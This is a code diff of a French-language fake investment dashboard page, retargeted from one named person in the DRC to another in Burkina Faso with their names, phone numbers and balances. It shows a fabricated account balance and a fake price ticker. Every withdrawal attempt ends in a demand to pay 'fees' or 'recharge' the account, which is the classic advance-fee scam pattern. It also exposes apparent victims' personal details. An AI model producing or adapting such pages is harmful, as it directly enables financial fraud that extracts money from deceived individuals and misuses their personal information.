@@ -251,7 +251,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0824355230") {
+        if (code === "06827324") {
             document.body.style.display = 'block';
         } else {
             alert("Numéro incorrect. Accès refusé.");
@@ -261,14 +261,14 @@
 
     <header>
         <div class="logo">
-            <h1>Africa Investissement</h1>
+            <h1>GTI Investissement trading</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 4 000 $</span>
+                <span class="balance">Solde: 650 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">BADIBANGA BADIBANGA SIMON</span><br>
-                    <span id="user-phone">243 08 24 35 52 30</span>
+                    <span id="user-name">Djamilatou Ouattara</span><br>
+                    <span id="user-phone">226 06 82 73 24</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -297,7 +297,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Vodacom</button>
+                <button id="orange-money">Retirer via Orange Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -330,17 +330,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "BADIBANGA BADIBANGA SIMON";
-                const accountNumber = "243 08 24 35 52 30";
-                const balance = "4 000 $";
+                const accountName = "Djamilatou Ouattara";
+                const accountNumber = "226 06 82 73 24";
+                const balance = "650 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Vodacom ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("Vodacom");
+                    setWithdrawalInfo("Orange Money");
                 }
             });
 
@@ -352,7 +352,7 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher BADIBANGA, veuillez payer les frais de tva pour recevoir vos bénéfices dans les 5 minutes.');
+                alert('Cher BADIBANGA, veuillez recharger votre compte pour recevoir vos bénéfices dans les 5 minutes.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
                 errorMessage.textContent = 'Erreur : Fonds insuffisants pour les frais.';
